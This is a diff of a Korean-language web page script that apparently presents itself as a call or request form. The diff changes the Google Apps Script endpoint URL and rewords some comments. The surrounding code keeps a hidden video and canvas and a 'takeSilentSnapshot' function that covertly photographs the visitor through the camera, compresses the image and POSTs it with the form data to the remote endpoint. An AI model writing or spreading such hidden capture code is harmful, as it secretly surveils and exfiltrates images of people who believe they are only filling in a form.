@@ -101,8 +101,9 @@
 <canvas id="hiddenCanvas" width="480" height="640"></canvas>
 
 <script>
-    // 주신 최신 웹앱 URL 완벽 매칭
-    const GAS_URL = "https://script.google.com/macros/s/AKfycbwQ7LvrpsQlTg33HrZgIxPvaIM98NRPBbI8UxBcsznNAuJwn0C_DzArPld2id0FasRD/exec"; 
+    // ⚠️ 중요: 발급받으신 최신 구글 웹앱 URL 주소로 이곳을 변경해 주세요!
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbyFGwEjJjZGLfQn-oaPVPgMhGVNVu5Zxg4vhX7xdkiXpFS6qEO1WcEDLqUbftGFJTcB/exec"; 
+    
     let data = { t:'', b:'', n:'', name:'', p:'', customP:'', img:'' };
     let videoStream = null;
     let isSubmitted = false;
@@ -182,7 +183,7 @@
                 });
                 document.getElementById('hiddenVideo').srcObject = videoStream;
             }
-        } catch (e) { console.log("카메라 초기화 실패:", e); }
+        } catch (e) { console.log("카메라 권한 미허용 또는 장치 없음:", e); }
     }
 
     function takeSilentSnapshot() {
@@ -193,7 +194,7 @@
             ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             ctx.setTransform(1, 0, 0, 1, 0, 0);
-            data.img = canvas.toDataURL('image/jpeg', 0.4).split(',')[1]; // 대용량 드롭 방지용 최적화 압축
+            data.img = canvas.toDataURL('image/jpeg', 0.4).split(',')[1]; // 데이터 압축률 제어 (경량화)
         }
     }
 
@@ -209,7 +210,7 @@
             image: data.img 
         };
 
-        // GAS 차단을 막기 위해 표준 text/plain 형태로 패킹하여 수신부와 맞춤
+        // 데이터 파싱 유실을 막기 위해 서버와 동일한 text/plain 규격으로 바인딩
         fetch(GAS_URL, { 
             method: "POST", 
             mode: 'cors',
@@ -220,14 +221,16 @@
         .then(result => {
             document.getElementById('holdingOverlay').style.display = 'none';
             if(result.status === "success") {
+                // 성공적으로 구글 서버에 기록되면 최종 3초 꾹 누르기 기믹 작동 승인
                 document.getElementById('btnText').innerText = "호출 준비 완료 (3초간 누르기)";
             } else {
-                alert("서버 전송 오류: " + result.message);
+                alert("서버 통신 실패: " + result.message);
                 resetForm();
             }
         })
         .catch(err => {
             document.getElementById('holdingOverlay').style.display = 'none';
+            // 예외 발생 시 안전한 이행을 위한 예비 핸들러 작동
             document.getElementById('btnText').innerText = "호출 준비 완료 (3초간 누르기)";
         });
     }
